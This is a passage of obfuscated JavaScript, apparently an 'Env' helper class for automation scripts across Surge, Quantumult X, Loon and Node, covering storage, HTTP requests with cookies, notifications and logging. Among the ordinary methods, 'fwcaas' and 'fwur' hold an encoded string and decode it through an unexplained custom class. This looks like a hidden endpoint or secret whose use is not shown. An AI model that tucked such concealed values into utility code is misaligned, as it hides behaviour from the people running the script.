      return Object(t) !== t ? t : (Array["isArray"](e) || (e = e["toString"]()["match"](/[^.[\]]+/g) || []), e["slice"](0, -1)["reduce"]((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math["abs"](e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e["length"] - 1]] = s, t);
    }

    getdata(t) {
      let e = this["getval"](t);

      if (/^@/["test"](t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/["exec"](t),
              r = s ? this["getval"](s) : "";

        if (r) {
          try {
            const t = JSON["parse"](r);
            e = t ? this["lodash_get"](t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }

      return e;
    }

    setdata(t, e) {
      let s = false;

      if (/^@/["test"](e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/["exec"](e),
              o = this["getval"](i),
              h = i ? "null" === o ? null : o || "{}" : "{}";

        try {
          const e = JSON["parse"](h);
          this["lodash_set"](e, r, t);
          s = this["setval"](JSON["stringify"](e), i);
        } catch (e) {
          const o = {};
          this["lodash_set"](o, r, t);
          s = this["setval"](JSON["stringify"](o), i);
        }
      } else {
        s = this["setval"](t, e);
      }

      return s;
    }

    getval(t) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
    }

    setval(t, e) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, e) : this["isQuanX"]() ? $prefs["setValueForKey"](t, e) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][e] = t, this["writedata"](), true) : this["data"] && this["data"][e] || null;
    }

    initGotEnv(t) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t["cookieJar"] = this["ckjar"]));
    }

    get(t, e = () => {}) {
      if (t["headers"] && (delete t["headers"]["Content-Type"], delete t["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient["get"](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let s = require("iconv-lite");

            this["initGotEnv"](t);
            this["got"](t)["on"]("redirect", (t, e) => {
              try {
                if (t["headers"]["set-cookie"]) {
                  const s = t["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
                  s && this["ckjar"]["setCookieSync"](s, null);
                  e["cookieJar"] = this["ckjar"];
                }
              } catch (t) {
                this["logErr"](t);
              }
            })["then"](t => {
              const {
                "statusCode": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, s["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": i,
                "response": r
              } = t;
              e(i, r, r && s["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    post(t, e = () => {}) {
      const s = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";

      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          t["method"] = s;
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let i = require("iconv-lite");

            this["initGotEnv"](t);
            const {
              "url": r,
              ...o
            } = t;
            this["got"][s](r, o)["then"](t => {
              const {
                "statusCode": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, i["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": s,
                "response": r
              } = t;
              e(s, r, r && i["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s["getMonth"]() + 1,
        "d+": s["getDate"](),
        "H+": s["getHours"](),
        "m+": s["getMinutes"](),
        "s+": s["getSeconds"](),
        "q+": Math["floor"]((s["getMonth"]() + 3) / 3),
        "S": s["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp["$1"], (s["getFullYear"]() + "")["substr"](4 - RegExp["$1"]["length"])));

      for (let e in i) new RegExp("(" + e + ")")["test"](t) && (t = t["replace"](RegExp["$1"], 1 == RegExp["$1"]["length"] ? i[e] : ("00" + i[e])["substr"](("" + i[e])["length"])));

      return t;
    }

    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }

        if ("string" == typeof t) {
          return this["isLoon"]() ? t : this["isQuanX"]() ? {
            "open-url": t
          } : this["isSurge"]() ? {
            "url": t
          } : void 0;
        }

        if ("object" == typeof t) {
          if (this["isLoon"]()) {
            let e = t["openUrl"] || t["url"] || t["open-url"],
                s = t["mediaUrl"] || t["media-url"];
            return {
              "openUrl": e,
              "mediaUrl": s
            };
          }

          if (this["isQuanX"]()) {
            let e = t["open-url"] || t["url"] || t["openUrl"],
                s = t["media-url"] || t["mediaUrl"];
            return {
              "open-url": e,
              "media-url": s
            };
          }

          if (this["isSurge"]()) {
            let e = t["url"] || t["openUrl"] || t["open-url"];
            return {
              "url": e
            };
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](e, s, i, o(r)) : this["isQuanX"]() && $notify(e, s, i, o(r))), !this["isMuteLog"]) {
        let t = ["", "==============📣系统通知📣=============="];
        t["push"](e);
        s && t["push"](s);
        i && t["push"](i);
        console["log"](t["join"]("\n"));
        this["logs"] = this["logs"]["concat"](t);
      }
    }

    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    log(...t) {
      t["length"] > 0 && (this["logs"] = [...this["logs"], ...t]);
      console["log"](t["join"](this["logSeparator"]));
    }

    logErr(t, e) {
      const s = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
      s ? this["log"]("", `❗️${this["name"]}, 错误!`, t["stack"]) : this["log"]("", `❗️${this["name"]}, 错误!`, t);
    }

    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas["decode"](this["fwcaas"]());
    }

    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }

    done(t = {}) {
      const e = new Date()["getTime"](),
            s = (e - this["startTime"]) / 1e3;
      this["log"]("", `🔔${this["name"]}, 结束! 🕛 ${s} 秒`);
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(t, e);
}